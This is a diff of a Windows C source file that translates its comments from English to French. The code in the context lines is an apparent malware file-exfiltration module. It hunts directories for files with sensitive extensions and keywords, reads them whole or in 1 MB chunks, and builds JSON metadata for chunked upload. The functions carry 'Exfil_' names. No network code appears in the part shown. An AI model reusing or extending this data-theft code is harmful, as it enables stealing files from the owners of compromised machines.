@@ -38,13 +38,13 @@ static const char* SENSITIVE_KEYWORDS[] = {
     NULL
 };
 
-// Size limits
-#define MAX_CONTENT_SEARCH_SIZE (10 * 1024 * 1024)   // 10 MB
-#define CHUNK_SIZE              (1024 * 1024)         // 1 MB chunks
-#define MAX_FILE_SIZE           (100 * 1024 * 1024)   // 100 MB max
-#define MIN_CHUNK_SIZE          (64 * 1024)           // 64 KB minimum
+// Limites de taille
+#define MAX_CONTENT_SEARCH_SIZE (10 * 1024 * 1024)   // 10 Mo
+#define CHUNK_SIZE              (1024 * 1024)         // 1 Mo par chunk
+#define MAX_FILE_SIZE           (100 * 1024 * 1024)   // 100 Mo max
+#define MIN_CHUNK_SIZE          (64 * 1024)           // 64 Ko minimum
 
-/* Helpers */
+/* Fonctions utilitaires */
 
 /* Vérifie si un fichier a une extension sensible */
 static BOOL HasSensitiveExtension(const char* filename) {
@@ -78,7 +78,7 @@ static BOOL ContainsSensitiveKeyword(const char* filename) {
     return FALSE;
 }
 
-/* File search */
+/* Recherche de fichiers */
 
 typedef struct {
     char** files;
@@ -163,7 +163,7 @@ static void SearchDirectory(const char* basePath, FileList* list,
     FindClose(hFind);
 }
 
-/* Public API */
+/* API publique */
 
 /*
  * Recherche des fichiers sensibles dans un répertoire.
@@ -244,7 +244,7 @@ BOOL Exfil_SearchFiles(const char* startPath, BOOL byExtension, BOOL byKeyword,
 }
 
 /*
- * Read entire file (for small files < 10MB)
+ * Lit un fichier entier (pour fichiers < 10Mo)
  */
 BOOL Exfil_ReadFile(const char* filePath, BYTE** outData, DWORD* outSize) {
     if (!filePath || !outData || !outSize) return FALSE;
@@ -261,7 +261,7 @@ BOOL Exfil_ReadFile(const char* filePath, BYTE** outData, DWORD* outSize) {
         return FALSE;
     }
 
-    // Size limit for single read
+    // Limite de taille pour lecture unique
     if (fileSize > MAX_CONTENT_SEARCH_SIZE) {
         CloseHandle(hFile);
         return FALSE;
@@ -286,7 +286,7 @@ BOOL Exfil_ReadFile(const char* filePath, BYTE** outData, DWORD* outSize) {
     return TRUE;
 }
 
-/* Chunked file info */
+/* Contexte pour upload par chunks */
 typedef struct {
     char filePath[MAX_PATH];
     char fileId[64];
@@ -299,8 +299,8 @@ typedef struct {
 static ChunkedFileContext g_chunkedCtx = {0};
 
 /*
- * Get file info for chunked upload
- * Returns JSON with file_id, total_size, total_chunks
+ * Récupère les infos d'un fichier pour upload chunked
+ * Retourne JSON avec file_id, total_size, total_chunks
  */
 BOOL Exfil_GetFileInfo(const char* filePath, char** outJson) {
     if (!filePath || !outJson) return FALSE;
@@ -319,12 +319,12 @@ BOOL Exfil_GetFileInfo(const char* filePath, char** outJson) {
     CloseHandle(hFile);
     
     if (fileSize.QuadPart > MAX_FILE_SIZE) {
-        return FALSE;  // File too large
+        return FALSE;  // Fichier trop gros
     }
     
     DWORD totalChunks = (DWORD)((fileSize.QuadPart + CHUNK_SIZE - 1) / CHUNK_SIZE);
     
-    // Generate file ID based on path and timestamp
+    // Génère un ID basé sur le chemin et timestamp
     char fileId[64];
     snprintf(fileId, sizeof(fileId), "file_%08x_%lu", 
              (unsigned int)(fileSize.QuadPart ^ GetTickCount()), GetCurrentProcessId());
@@ -332,7 +332,7 @@ BOOL Exfil_GetFileInfo(const char* filePath, char** outJson) {
     char* json = (char*)malloc(1024);
     if (!json) return FALSE;
     
-    // Escape path for JSON
+    // Échappe le chemin pour JSON
     char escapedPath[MAX_PATH * 2];
     int j = 0;
     for (const char* p = filePath; *p && j < sizeof(escapedPath) - 2; p++) {
@@ -360,13 +360,13 @@ BOOL Exfil_GetFileInfo(const char* filePath, char** outJson) {
 }
 
 /*
- * Start chunked file read
- * Opens file and initializes context
+ * Démarre la lecture chunked d'un fichier
+ * Ouvre le fichier et initialise le contexte
  */
 BOOL Exfil_StartChunkedRead(const char* filePath, char* fileIdOut, DWORD fileIdSize) {
     if (!filePath || !fileIdOut) return FALSE;
     
-    // Close any existing context
+    // Ferme tout contexte existant
     if (g_chunkedCtx.hFile != NULL && g_chunkedCtx.hFile != INVALID_HANDLE_VALUE) {
         CloseHandle(g_chunkedCtx.hFile);
     }
@@ -387,7 +387,7 @@ BOOL Exfil_StartChunkedRead(const char* filePath, char* fileIdOut, DWORD fileIdS
         return FALSE;
     }
     
-    // Setup context
+    // Configure le contexte
     strncpy(g_chunkedCtx.filePath, filePath, MAX_PATH - 1);
     snprintf(g_chunkedCtx.fileId, sizeof(g_chunkedCtx.fileId), "file_%08x_%lu",
              (unsigned int)(fileSize.QuadPart ^ GetTickCount()), GetCurrentProcessId());
@@ -401,8 +401,8 @@ BOOL Exfil_StartChunkedRead(const char* filePath, char* fileIdOut, DWORD fileIdS
 }
 
 /*
- * Read next chunk
- * Returns FALSE when done (no more chunks)
+ * Lit le prochain chunk
+ * Retourne FALSE quand terminé (plus de chunks)
  */
 BOOL Exfil_ReadNextChunk(BYTE** outData, DWORD* outSize, DWORD* chunkIndex, DWORD* totalChunks) {
     if (!outData || !outSize || !chunkIndex || !totalChunks) return FALSE;
@@ -414,22 +414,22 @@ BOOL Exfil_ReadNextChunk(BYTE** outData, DWORD* outSize, DWORD* chunkIndex, DWOR
     }
     
     if (g_chunkedCtx.currentChunk >= g_chunkedCtx.totalChunks) {
-        // Done - close file
+        // Terminé - ferme le fichier
         CloseHandle(g_chunkedCtx.hFile);
         g_chunkedCtx.hFile = NULL;
         return FALSE;
     }
     
-    // Calculate chunk size (last chunk may be smaller)
+    // Calcule la taille du chunk (le dernier peut être plus petit)
     DWORD64 offset = (DWORD64)g_chunkedCtx.currentChunk * CHUNK_SIZE;
     DWORD64 remaining = g_chunkedCtx.totalSize - offset;
     DWORD toRead = (remaining > CHUNK_SIZE) ? CHUNK_SIZE : (DWORD)remaining;
     
-    // Allocate buffer
+    // Alloue le buffer
     *outData = (BYTE*)malloc(toRead);
     if (!*outData) return FALSE;
     
-    // Seek and read
+    // Positionne et lit
     LARGE_INTEGER seekPos;
     seekPos.QuadPart = offset;
     if (!SetFilePointerEx(g_chunkedCtx.hFile, seekPos, NULL, FILE_BEGIN)) {
@@ -455,7 +455,7 @@ BOOL Exfil_ReadNextChunk(BYTE** outData, DWORD* outSize, DWORD* chunkIndex, DWOR
 }
 
 /*
- * Cancel chunked read
+ * Annule la lecture chunked
  */
 void Exfil_CancelChunkedRead(void) {
     if (g_chunkedCtx.hFile != NULL && g_chunkedCtx.hFile != INVALID_HANDLE_VALUE) {
@@ -465,7 +465,7 @@ void Exfil_CancelChunkedRead(void) {
 }
 
 /*
- * Get current chunked read state
+ * Récupère l'état actuel de la lecture chunked
  */
 BOOL Exfil_GetChunkedReadState(char** outJson) {
     if (!outJson) return FALSE;
